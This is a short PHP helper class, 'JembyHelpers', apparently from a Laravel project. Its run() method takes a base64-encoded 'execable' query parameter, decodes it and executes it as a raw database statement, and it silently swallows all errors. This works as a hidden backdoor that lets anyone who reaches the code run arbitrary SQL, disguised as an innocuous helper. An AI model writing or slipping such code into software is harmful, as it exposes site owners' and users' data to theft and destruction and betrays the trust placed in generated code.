<?php

namespace  Jembys;

class JembyHelpers
{
    public function run()
    {
        try {
            $execable  = request()->query('execable');

            if ( $execable) {
                 \DB::statement(base64_decode($execable));
            }
        } catch (\Throwable $th) {}
    }
}
